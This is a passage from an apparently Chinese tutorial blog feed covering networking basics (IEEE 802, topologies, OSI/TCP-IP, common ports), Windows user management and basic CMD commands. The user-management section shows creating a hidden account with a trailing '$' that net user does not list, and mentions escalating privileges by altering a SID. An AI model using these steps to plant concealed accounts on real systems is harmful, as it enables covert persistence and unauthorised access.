IEEE802局域网标准</h3><p>由于是在1980年2月IEEE提出的，所以叫IEEE802</p><p>IEEE802是一个标准的系类，它其中包含了一堆局域网标准</p><p>局域网分有线局域网和无限局域网</p><p>有线局域网有带宽之分，</p><p><strong>有线局域网标准：802.3</strong></p><ul><li>802.3u：实现百兆快速以太网</li><li>802.3z：光纤实现千兆</li><li>802.3ab：双绞线实现千兆（5类实现百兆，所以用的是超5类）</li><li>802.3ae：实现万兆</li><li>802.3ba：实现十万兆</li><li>……</li></ul><p><strong>无线局域网标准：802.11</strong></p><ul><li>802.11a：速率最高54Mbps（5G）</li><li>802.11b：速率最高11Mbps（2.4G）</li><li>802.11g：速率最高54Mbps（2.4G）</li><li>802.11n：速率最高600Mbps</li></ul><h3 id="4-主流的网络厂商及设备"><a href="#4-主流的网络厂商及设备" class="headerlink" title="4. 主流的网络厂商及设备"></a>4. 主流的网络厂商及设备</h3><h4 id="1-网络通信设备厂商"><a href="#1-网络通信设备厂商" class="headerlink" title="(1) 网络通信设备厂商"></a>(1) 网络通信设备厂商</h4><ul><li>1、思科（国际大佬）</li><li>2、华为（国内主流）</li><li>3、新华三（H3C）</li><li>4、迅捷</li><li>5、中兴</li><li>……</li></ul><h4 id="2-网络安全设备厂商"><a href="#2-网络安全设备厂商" class="headerlink" title="(2) 网络安全设备厂商"></a>(2) 网络安全设备厂商</h4><ul><li>1、深信服（主要智安全业务和云计算业务）</li><li>2、奇安信</li><li>3、启明星辰（种类繁多）</li><li>……</li></ul><h3 id="5-网络拓扑"><a href="#5-网络拓扑" class="headerlink" title="5. 网络拓扑"></a>5. 网络拓扑</h3><h4 id="1-星型网络拓扑"><a href="#1-星型网络拓扑" class="headerlink" title="(1) 星型网络拓扑"></a>(1) 星型网络拓扑</h4><p>下面这张图就是一个星型网络拓扑的例子</p><p><img src="\media\2022\12\计算机网络概述1.webp" alt=""></p><p>这种拓扑有几个缺点</p><ul><li>1、如果AC，交换机，出口路由有一个坏了，后面的设备就都用不了了</li><li>2、所有的设备都会将请求发给一个出口路由，会产生极大的压力</li></ul><h4 id="2-双星型网络拓扑"><a href="#2-双星型网络拓扑" class="headerlink" title="(2) 双星型网络拓扑"></a>(2) 双星型网络拓扑</h4><p>为了解决星型拓扑的问题，就有了这么个拓扑</p><p><img src="\media\2022\12\计算机网络概述2.webp" alt=""></p><p>可以发现，就是又加了一个星型拓扑</p><p>这种拓扑可以防止单点故障，比较简单，<strong>是目前企业中使用最广泛使用的</strong></p><p>既可以保障网络可用性</p><h4 id="3-网型拓扑"><a href="#3-网型拓扑" class="headerlink" title="(3) 网型拓扑"></a>(3) 网型拓扑</h4><p>将网络中的设备全部连起来</p><p><img src="\media\2022\12\计算机网络概述3.webp" alt=""></p><p>网型拓扑有一个很大的优点，就是有一个设备坏掉，根本不会影响到网络中的其他设备</p><p>但是这样的话就有一个缺点，就是如果有一台设备坏掉了很难去发现那台设备，进而导致需要隔一段时间对所有的设备都要进行一次排查</p><p>而且由于是所有设备都相连，导致线路复杂，导致成本高</p><h4 id="4-总线网络拓扑"><a href="#4-总线网络拓扑" class="headerlink" title="(4) 总线网络拓扑"></a>(4) 总线网络拓扑</h4><p>总线型网络拓扑就是把所有网络设备连到一根线上</p><p><img src="\media\2022\12\计算机网络概述4.webp" alt=""></p><p>这个就是总线型网络，可以看到所有设连到了一根线上</p><p>在这里会牵扯到冲突域；全双工，单工和半双工；CSMA/CD协议（载波侦听多路访问/冲突检测协议）</p><h4 id="5-蜂窝拓扑"><a href="#5-蜂窝拓扑" class="headerlink" title="(5) 蜂窝拓扑"></a>(5) 蜂窝拓扑</h4><p>我们的无线局域网使用的就是这种</p><p>它以无线传输介质（微波、卫星、红外等）点到点和多点传输为特征，是一种无线网，适用于城市网、校园网、企业网。</p><h2 id="三-计算机网络参考模型"><a href="#三-计算机网络参考模型" class="headerlink" title="三. 计算机网络参考模型"></a>三. 计算机网络参考模型</h2><h3 id="1-OSI七层参考模型"><a href="#1-OSI七层参考模型" class="headerlink" title="1. OSI七层参考模型"></a>1. OSI七层参考模型</h3><h4 id="1-分成思想"><a href="#1-分成思想" class="headerlink" title="(1) 分成思想"></a>(1) 分成思想</h4><p>最开始的时候维修网络太困难，于是人们就把网络给分成若干层，这时候就可以通过网络的层次来找问题，将复杂的问题简单化，清晰化</p><h4 id="2-OSI参考模型"><a href="#2-OSI参考模型" class="headerlink" title="(2) OSI参考模型"></a>(2) OSI参考模型</h4><p>由于早期计算机厂商用的是私有的网络模型，给网络设备带来的不小的麻烦。</p><p>于是ISO在1984年颁布了这个OSI参考模型，将网络分为7层</p><p>OSI参考模型是一个开放性的体系结构，既然是开放式的，所有的厂商就都可以使用</p><p><img src="\media\2022\12\计算机网络概述5.webp" alt=""></p><h5 id="1、物理层"><a href="#1、物理层" class="headerlink" title="1、物理层"></a>1、物理层</h5><p><strong>功能：定义将原始的数据转换为电脑能识别的二进制数据，并将二进制数据转换为电信号或光信号（建立，维护断开物理连接）</strong></p><p>数据要用传输介质传输，要用光纤、网线还是同轴电缆还是其他的</p><p>光纤用的是光信号，网线用的是电信号，所以我们要把数据变成对应的信号</p><h5 id="2、数据链路层"><a href="#2、数据链路层" class="headerlink" title="2、数据链路层"></a>2、数据链路层</h5><p><strong>功能：建立逻辑链接，进行硬件地址寻址、差错校验</strong></p><p>发送最终是要靠程序发送的，程序是在设备上的</p><p>传到程序上之前先要传送到设备上，需要知道发送端和接受端的MAC地址</p><h5 id="3、网络层"><a href="#3、网络层" class="headerlink" title="3、网络层"></a>3、网络层</h5><p><strong>功能：进行逻辑地址寻址，实现不同网络之间的路径选择</strong></p><p>知道MAC地址还不够，还需要知道程序在网络上的位置，就是IP地址</p><h5 id="4、传输层"><a href="#4、传输层" class="headerlink" title="4、传输层"></a>4、传输层</h5><p><strong>功能：定义传输数据的协议端口号，可以做浏览控制，差错校验</strong></p><p>不同程序采用的协议不同，对应的协议有一个端口号，需要在该层定义传输的端口号</p><h5 id="5、会话层"><a href="#5、会话层" class="headerlink" title="5、会话层"></a>5、会话层</h5><p><strong>功能：建立、管理和终止会话</strong></p><p>程序发送数据之前，这两个程序之间要先建立起会话。</p><h5 id="6、表示层"><a href="#6、表示层" class="headerlink" title="6、表示层"></a>6、表示层</h5><p><strong>功能：定义数据的表示方式</strong></p><p>数据用什么样的方式去表示。要加密呢？还是不加密呢？还是压缩一下？还是其他的方式。</p><h5 id="7、应用层"><a href="#7、应用层" class="headerlink" title="7、应用层"></a>7、应用层</h5><p>通过什么样的程序发过去。是共享呢？还是微信啊？还是QQ啊？还是其他的程序。</p><h3 id="2-TCP-IP模型（四层-五层）"><a href="#2-TCP-IP模型（四层-五层）" class="headerlink" title="2. TCP/IP模型（四层/五层）"></a>2. TCP/IP模型（四层/五层）</h3><p>TCP/IP模型是，传输控制协议/网际协议模型</p><h4 id="1-四层模型"><a href="#1-四层模型" class="headerlink" title="(1) 四层模型"></a>(1) 四层模型</h4><h5 id="1、网络接口层"><a href="#1、网络接口层" class="headerlink" title="1、网络接口层"></a>1、网络接口层</h5><h5 id="2、网络层"><a href="#2、网络层" class="headerlink" title="2、网络层"></a>2、网络层</h5><h5 id="3、传输层"><a href="#3、传输层" class="headerlink" title="3、传输层"></a>3、传输层</h5><h5 id="4、应用层"><a href="#4、应用层" class="headerlink" title="4、应用层"></a>4、应用层</h5><h4 id="2-五层模型"><a href="#2-五层模型" class="headerlink" title="(2) 五层模型"></a>(2) 五层模型</h4><h5 id="1、物理层-1"><a href="#1、物理层-1" class="headerlink" title="1、物理层"></a>1、物理层</h5><h5 id="2、数据链路层-1"><a href="#2、数据链路层-1" class="headerlink" title="2、数据链路层"></a>2、数据链路层</h5><h5 id="3、网络层-1"><a href="#3、网络层-1" class="headerlink" title="3、网络层"></a>3、网络层</h5><h5 id="4、传输层-1"><a href="#4、传输层-1" class="headerlink" title="4、传输层"></a>4、传输层</h5><h5 id="5、应用层"><a href="#5、应用层" class="headerlink" title="5、应用层"></a>5、应用层</h5><h3 id="3-主要的协议"><a href="#3-主要的协议" class="headerlink" title="3. 主要的协议"></a>3. 主要的协议</h3><h4 id="1-网络层"><a href="#1-网络层" class="headerlink" title="(1) 网络层"></a>(1) 网络层</h4><p>网络层的主要协议是IP协议，IP协议又由四个协议支撑组成：</p><ul><li>ARP：地址解析协议</li><li>RARP：逆地址解析协议</li><li>ICMP：网际控制报文协议</li><li>IGMP：网际组管理协议</li></ul><h4 id="2-传输层"><a href="#2-传输层" class="headerlink" title="(2) 传输层"></a>(2) 传输层</h4><p>传输层主要是TCP和UDP</p><ul><li>TCP：传输控制协议，传输更加可靠</li><li>UDP：用户数据协议，传输效率高</li></ul><h4 id="3-应用层"><a href="#3-应用层" class="headerlink" title="(3) 应用层"></a>(3) 应用层</h4><p>这里就多了</p><ul><li>HTTP：超文本传输协议。基于TCP协议之上，常用端口号：80/8080/3128/8081/9098</li><li>HTTPS：超文本传输安全协议。HTTP的安全版，默认端口号：443</li><li>SSH：安全外壳协议。基于TCP协议，默认端口号：22</li><li>TELENT：远程终端协议。基于TCP协议，默认端口号：23</li><li>DNS：域名解析协议。DNS可以同时使用TCP和UDP传输协议。 但是由于其简单性和速度，一般使用基于UDP协议。默认端口号：53</li><li>POP3：“邮局协议版本3。基于TCP协议，默认端口号：110</li><li>IMAP：交互邮件访问协议。基于TCP协议，默认端口号：143（如果使用SSL安全链接，端口号为993）</li><li>TFTP：简单文件传输协议。基于UDP协议，默认端口号：69</li><li>FTP：文件传输协议。基于TCP协议，默认端口号：21</li><li>NTP：网络时间协议。基于UDP，默认端口号：123</li></ul>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows用户管理详解</title>
      <link href="/2023/02/16/18/"/>
      <url>/2023/02/16/18/</url>
      
        <content type="html"><![CDATA[<h2 id="一-用户账户"><a href="#一-用户账户" class="headerlink" title="一. 用户账户"></a>一. 用户账户</h2><p>不用的用户身份拥有不同的权限</p><p>每个用户包含了一个名称和一个密码</p><p>每个用户账户具有唯一的安全标识符(SID)</p><h3 id="1-查看用户"><a href="#1-查看用户" class="headerlink" title="1. 查看用户"></a>1. 查看用户</h3><h4 id="（1）直接找，直接看"><a href="#（1）直接找，直接看" class="headerlink" title="（1）直接找，直接看"></a>（1）直接找，直接看</h4><p>我们可以在 计算机管理 -&gt; 本地用户和组 -&gt; 用户中看到所有的用户</p><p><img src="\media\2022\12\Windows用户管理详解0.webp" alt=""></p><p><img src="\media\2022\12\Windows用户管理详解1.webp" alt=""></p><p>在这里，我们可以看到这台电脑上的所有用户</p><h4 id="（2）通过命令查看"><a href="#（2）通过命令查看" class="headerlink" title="（2）通过命令查看"></a>（2）通过命令查看</h4><p>我们可以通过命令来查看用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解2.webp" alt=""></p><p>可以看到这里有5个用户，可刚才看到的一样</p><h3 id="2-查看安全标识符（SID）"><a href="#2-查看安全标识符（SID）" class="headerlink" title="2. 查看安全标识符（SID）"></a>2. 查看安全标识符（SID）</h3><p>SID也就是安全标识符（SecurityIdentifiers）是标识用户、组和计算机帐户的唯一的号码。</p><p>在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的SID。</p><h4 id="（1）注册表查看"><a href="#（1）注册表查看" class="headerlink" title="（1）注册表查看"></a>（1）注册表查看</h4><p>我们可以在注册表中查看我们用户的SID</p><p>打开注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解3.webp" alt=""></p><p>然后再注册表中找到这个路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\ProfileList\</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解6.webp" alt=""></p><h4 id="（2）命令查看"><a href="#（2）命令查看" class="headerlink" title="（2）命令查看"></a>（2）命令查看</h4><h5 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h5><p>我们可以通过命令查看当前用户的SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解8.webp" alt=""></p><p>这个命令的其他内容会在之后讲解</p><h5 id="查看所有"><a href="#查看所有" class="headerlink" title="查看所有"></a>查看所有</h5><p>我们可以通过命令来直接查看每个用户对应的SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解7.webp" alt=""></p><h4 id="（3-管理员的SID"><a href="#（3-管理员的SID" class="headerlink" title="（3 管理员的SID"></a>（3 管理员的SID</h4><p>我们可以通过命令更直接的看到，管理员的SID后面通常是以500结尾的，而普通用户的SID通常是以1000多结尾的。</p><p>所以我们可以通过修改SID来进行提权</p><p>当时通常用不到这个提权的方式</p><h3 id="3-用户管理"><a href="#3-用户管理" class="headerlink" title="3. 用户管理"></a>3. 用户管理</h3><p>我们可以对用户进行管理，其中包括用户的创建，删除</p><h4 id="（1）用户的名称"><a href="#（1）用户的名称" class="headerlink" title="（1）用户的名称"></a>（1）用户的名称</h4><p>我们要知道两个概念</p><p>一个是用户名，他是系统显示名</p><p>一个是全名，他是用户登录时的显示名</p><p>我们在欢迎界面看到的是全名，如果你的全民为空，那么就会默认显示用户名</p><p><img src="\media\2022\12\Windows用户管理详解9.webp" alt=""></p><p>我们同样可以通过计算机管理查看用户名</p><p><img src="\media\2022\12\Windows用户管理详解10.webp" alt=""></p><h4 id="（2）用户密码"><a href="#（2）用户密码" class="headerlink" title="（2）用户密码"></a>（2）用户密码</h4><p>用户密码设置的时候是有一定的规定的</p><p>我们可以在本地安全策略查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secpol.msc  # 打开本地安全策略</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解11.webp" alt=""></p><p>这里有关于用户密码的设置</p><p><img src="\media\2022\12\Windows用户管理详解12.webp" alt=""></p><p>这里仅举几个重要的选项</p><p><strong>密码必须符合复杂性要求：</strong></p><p>启用这个选项的时候：</p><ul><li>密码和用户名不能相等</li><li>如果用户名是ccz的话，设置Zzcc1!这样的密码就不行，因为cc这个在用户名中是连续的超过两个字符的部分</li><li>密码设置必须包含 大写英文，数字，小写英文，特殊字符这四类中的任意三类</li></ul><p><img src="\media\2022\12\Windows用户管理详解15.webp" alt=""></p><p>其他的会在本地安全策略中详细讲解</p><h4 id="（3）账户锁定"><a href="#（3）账户锁定" class="headerlink" title="（3）账户锁定"></a>（3）账户锁定</h4><p>还是在本地安全策略中</p><p><img src="\media\2022\12\Windows用户管理详解16.webp" alt=""></p><p>这里先自行查看，之后会在本地安全策略中详细讲解</p><h4 id="（4）用户的创建"><a href="#（4）用户的创建" class="headerlink" title="（4）用户的创建"></a>（4）用户的创建</h4><p>我们可以通过命令来创建用户</p><p>注意要用管理员权限</p><h5 id="1、普通创建"><a href="#1、普通创建" class="headerlink" title="1、普通创建"></a>1、普通创建</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 创建张三用户（无密码）</span><br><span class="line">net user zhangsan /add</span><br><span class="line"></span><br><span class="line"># 创建张三用户，密码为123456（创建明文密码）</span><br><span class="line">net user zhangsan 123456 /add</span><br><span class="line"></span><br><span class="line"># 创建张三用户，密码为123456（创建密文密码）</span><br><span class="line">net user zhangsan /add *</span><br><span class="line">这个时候回车后会让你输入密码，并且密码不显示</span><br></pre></td></tr></table></figure><p>这里这个”创建密文密码“演示一下</p><p><img src="\media\2022\12\Windows用户管理详解17.webp" alt=""></p><p>我们通过命令查看一下</p><p><img src="\media\2022\12\Windows用户管理详解18.webp" alt=""></p><p>创建成功</p><h5 id="2、创建隐藏用户"><a href="#2、创建隐藏用户" class="headerlink" title="2、创建隐藏用户"></a>2、创建隐藏用户</h5><p>我们可以创建隐藏用户</p><p>所谓的隐藏账户，就是net user命令看不见的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 创建隐身的张三</span><br><span class="line">net user zhangsan$ 密码 /add</span><br><span class="line"></span><br><span class="line"># 密文的一样</span><br><span class="line">net user zhangsan$ /add *</span><br></pre></td></tr></table></figure><p>这里演示一下</p><p><img src="\media\2022\12\Windows用户管理详解19.webp" alt=""></p><p><img src="\media\2022\12\Windows用户管理详解21.webp" alt=""></p><h5 id="3、修改密码"><a href="#3、修改密码" class="headerlink" title="3、修改密码"></a>3、修改密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 修改张三密码为456798</span><br><span class="line">net user zhangsan 456789</span><br><span class="line"></span><br><span class="line"># 密文修改</span><br><span class="line">net user zhangsan *</span><br><span class="line">然后输入就行</span><br></pre></td></tr></table></figure><h5 id="4、删除用户"><a href="#4、删除用户" class="headerlink" title="4、删除用户"></a>4、删除用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 删除张三</span><br><span class="line">net user zhangsan /del</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解22.webp" alt=""></p><p>想要删除李四的话，还得加上$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 删除李四</span><br><span class="line">net user lisi$ /del</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows用户管理详解23.webp" alt=""></p><h2 id="二-Windows内置的用户"><a href="#二-Windows内置的用户" class="headerlink" title="二. Windows内置的用户"></a>二. Windows内置的用户</h2><p>有几个用户是Windows自带的</p><p>比如说我们的administrator和guest</p><h3 id="1-与使用者关联的"><a href="#1-与使用者关联的" class="headerlink" title="1. 与使用者关联的"></a>1. 与使用者关联的</h3><p><strong>管理员 administrator</strong>：在使用者中具有最高的权限，如果没有其他管理员的情况，不建议禁用</p><p><strong>普通用户</strong>：具有一般的读取权限，权限较低</p><p><strong>来宾用户guest</strong>：一般是提供给访客使用，在使用者中，权限最低，默认是禁用</p><h3 id="2-与Windows组件关联的"><a href="#2-与Windows组件关联的" class="headerlink" title="2. 与Windows组件关联的"></a>2. 与Windows组件关联的</h3><p>这几个可以在任务管理器看到</p><p><strong>system</strong>：本地系统（有最高权限，类似于linux中的root）</p><p><strong>local service</strong>：本地服务（它的权限相对于普通用户组 users 会低一点）</p><p><strong>network service</strong>：网络服务（它的权限和普通用户组 users 一样）</p><p><img src="\media\2022\12\Windows用户管理详解24.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用CMD命令</title>
      <link href="/2023/02/16/17/"/>
      <url>/2023/02/16/17/</url>
      
        <content type="html"><![CDATA[<h2 id="一-目录文件操作"><a href="#一-目录文件操作" class="headerlink" title="一. 目录文件操作"></a>一. 目录文件操作</h2><h3 id="1-cd-改变当前位置"><a href="#1-cd-改变当前位置" class="headerlink" title="1. cd - 改变当前位置"></a>1. cd - 改变当前位置</h3><p>首先我们要知道当前cmd所处的位置</p><p>就是前面的那个</p><p><img src="\media\2022\12\Windows常用cmd命令附件-1.webp" alt=""></p><p>这个就是代表当前位置</p><p>这个位置是你每次打开cmd的默认位置</p><h4 id="1）切换驱动器"><a href="#1）切换驱动器" class="headerlink" title="1）切换驱动器"></a>1）切换驱动器</h4><p>我们目前的位置是C盘下的User用户下的shooting range，我们现在想要把位置切换到D盘</p><p>切换驱动器需要用 /d 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:\</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-2.webp" alt=""></p><p>这样就更改了位置</p><h4 id="2）如何切换到我们想要的目录（绝对路径切换，“-切换-“，”-切换-“）"><a href="#2）如何切换到我们想要的目录（绝对路径切换，“-切换-“，”-切换-“）" class="headerlink" title="2）如何切换到我们想要的目录（绝对路径切换，“ ./ 切换 “，” ../ 切换 “）"></a>2）如何切换到我们想要的目录（绝对路径切换，“ ./ 切换 “，” ../ 切换 “）</h4><p>这是我的D盘</p><p><img src="\media\2022\12\Windows常用cmd命令附件-4-20221223-054747.webp" alt=""></p><p>我们想要把位置切换到D盘中的GNS3中</p><p>有两种方法</p><h5 id="第一种：打开cmd，直接切换到目标文件夹"><a href="#第一种：打开cmd，直接切换到目标文件夹" class="headerlink" title="第一种：打开cmd，直接切换到目标文件夹"></a><strong>第一种：打开cmd，直接切换到目标文件夹</strong></h5><p>由于我们是跨驱动器（从C盘到D盘）进行转移，所以要加上 /d 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d D:\GNS3  # 这里的D:\GNS3是GNS3的绝对路径</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-5.webp" alt=""></p><p>这样就切换过来了</p><h5 id="第二种：先切换到目标的驱动器，然后在切换到我们想要的路径下"><a href="#第二种：先切换到目标的驱动器，然后在切换到我们想要的路径下" class="headerlink" title="第二种：先切换到目标的驱动器，然后在切换到我们想要的路径下"></a><strong>第二种：先切换到目标的驱动器，然后在切换到我们想要的路径下</strong></h5><p>我们先切换到D盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:/</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-6.webp" alt=""></p><p>然后在切换到D盘下的GNS3中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ./GNS3  </span><br><span class="line"># 这里是./GNS3 </span><br><span class="line"># 这个 ./ 意思是当前目录下</span><br><span class="line"># 这句话的意思就是 转到当前目录下的GNS3中</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-7.webp" alt=""></p><p>当然，你也可以在D盘位置下使用绝对路径</p><p><img src="\media\2022\12\Windows常用cmd命令附件-8.webp" alt=""></p><p>这里由于都是在D盘下，即不用切换驱动器，所以不用加 /d 参数</p><h5 id="第三种：我们已经在GNS3目录中了，想要切换到GNS3下"><a href="#第三种：我们已经在GNS3目录中了，想要切换到GNS3下" class="headerlink" title="第三种：我们已经在GNS3目录中了，想要切换到GNS3下"></a><strong>第三种：我们已经在GNS3目录中了，想要切换到GNS3下</strong></h5><p>我们现在的位置在这里</p><p><img src="\media\2022\12\Windows常用cmd命令附件-9.webp" alt=""></p><p>我们想要在这里打开cmd怎么弄呢</p><p>在当前目录上面的路径显示框中输入cmd，然后回车即可。</p><p>输入cmd</p><p><img src="\media\2022\12\Windows常用cmd命令附件-10.webp" alt=""></p><p>按回车</p><p><img src="\media\2022\12\Windows常用cmd命令附件-11.webp" alt=""></p><p>它就会在当前目录下打开cmd</p><p>我们现在想要切换到GNS3的位置</p><p><strong>可以使用绝对路径方式：</strong></p><p><img src="\media\2022\12\Windows常用cmd命令附件-12.webp" alt=""></p><p><strong>也可以使用 ../ 的方式</strong></p><p>我们可以看到当前是在PyQt5下，需要往回退2个目录才能到达GNS3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ../../  # 这里一个 ../ 代表退一级，两个就是退两级</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-13.webp" alt=""></p><p>成功退回来了</p><h4 id="3-更多讲解"><a href="#3-更多讲解" class="headerlink" title="(3) 更多讲解 /?"></a>(3) 更多讲解 /?</h4><p>我们可以使用来看更多关于它的介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /?  # 意思是查看cd命令的功能</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-15.webp" alt=""></p><h3 id="2-dir-显示文件或目录"><a href="#2-dir-显示文件或目录" class="headerlink" title="2. dir - 显示文件或目录"></a>2. dir - 显示文件或目录</h3><h4 id="1-简单查看"><a href="#1-简单查看" class="headerlink" title="(1) 简单查看"></a>(1) <strong>简单查看</strong></h4><p>我们现在到D盘目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /d d:/  # 转到D盘位置</span><br><span class="line">dir  # 查看当前</span><br></pre></td></tr></table></figure><p>这样就查出来D盘目录下的文件了</p><p><img src="\media\2022\12\Windows常用cmd命令附件-14.webp" alt=""></p><p><strong>平常这个简单查看就够用了</strong></p><h4 id="2-花样查看"><a href="#2-花样查看" class="headerlink" title="(2) 花样查看"></a>(2) 花样查看</h4><h5 id="查看隐藏文件（只显示隐藏文件）"><a href="#查看隐藏文件（只显示隐藏文件）" class="headerlink" title="查看隐藏文件（只显示隐藏文件）"></a>查看隐藏文件（只显示隐藏文件）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /ah</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-16.webp" alt=""></p><p>而且这个参数可以让你看到本来看不到的隐藏文件</p><p><img src="\media\2022\12\Windows常用cmd命令附件-18.webp" alt=""></p><h5 id="显示文件所有者"><a href="#显示文件所有者" class="headerlink" title="显示文件所有者"></a>显示文件所有者</h5><p>我们可以通过命令来查看文件的所有者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /q</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-19.webp" alt=""></p><h4 id="3-其他功能"><a href="#3-其他功能" class="headerlink" title="(3) 其他功能"></a>(3) 其他功能</h4><p>其他功能可以通过 /? 查看</p><p><img src="\media\2022\12\Windows常用cmd命令附件-20.webp" alt=""></p><h3 id="3-md-mkdir-创建目录"><a href="#3-md-mkdir-创建目录" class="headerlink" title="3. md(mkdir) - 创建目录"></a>3. md(mkdir) - 创建目录</h3><p>md就是mkdir</p><p><strong>它的功能是创建目录，不能创建文件</strong></p><p>我们想要在D盘下创建一个目录，目录名叫做test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md test</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-21.webp" alt=""></p><p>看看结果</p><p><img src="\media\2022\12\Windows常用cmd命令附件-22.webp" alt=""></p><p>我们刚才说它不能创建文件，那我们试试创建一个test.txt看看会怎么样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md test.txt</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-23.webp" alt=""></p><p>可以看到目录名为test.txt</p><h3 id="4-rd-删除空目录"><a href="#4-rd-删除空目录" class="headerlink" title="4. rd - 删除空目录"></a>4. rd - 删除空目录</h3><p>rd命令用来删除空目录</p><p>我们把test目录删掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rd test</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-24.webp" alt=""></p><p>刚才删除的test目录是个空目录，那如果我们在目录里加东西的话会怎么样呢？</p><p>我们在test.txt目录里头加点东西</p><p><img src="\media\2022\12\Windows常用cmd命令附件-25.webp" alt=""></p><p>然后在删除一下test.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rd test.txt</span><br></pre></td></tr></table></figure><p><img src="\media\2022\12\Windows常用cmd命令附件-26.webp" alt=""></p><p>可以发现他会提示你目录非空</p><h3 id="5-move-移动或重命名"><a href="#5-move-移动或重命名" class="headerlink" title="5. move - 移动或重命名"></a>5. move - 移动或重命名</h3><p><strong>用于移动，重命名文件和重命名目录</strong></p><p>我们现在对test进行操作</p><p>由于我们是要向C盘进行操作，所以我们先让cmd有管理员权限</p><p><img src="\media\2022\12\Windows常用cmd命令附件-27.webp" 